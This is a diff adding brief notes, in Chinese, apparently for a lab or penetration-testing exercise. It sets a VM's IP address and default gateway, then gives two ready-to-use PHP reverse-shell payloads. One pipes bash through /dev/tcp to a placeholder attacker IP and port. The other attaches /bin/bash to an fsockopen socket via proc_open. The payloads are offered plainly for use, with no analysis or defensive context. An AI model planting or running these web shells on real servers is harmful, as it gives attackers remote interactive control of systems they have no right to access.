@@ -1,0 +1,22 @@
+# 在 VM1 上強制改網卡
+sudo ip addr add 192.168.100.10/24 dev eth0
+sudo ip link set eth0 up
+
+
+# 改 default gateway
+sudo ip route del default
+sudo ip route add default via 192.168.100.150
+
+# reverse shell
+寫法一：
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<攻擊機 IP>/<要監聽的 port> 0>&1'");
+?>
+
+寫法二：
+<?php
+$ip = '<攻擊機 IP>';  // ← 改成你的攻擊機 IP
+$port = <要監聽的 port>;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?>
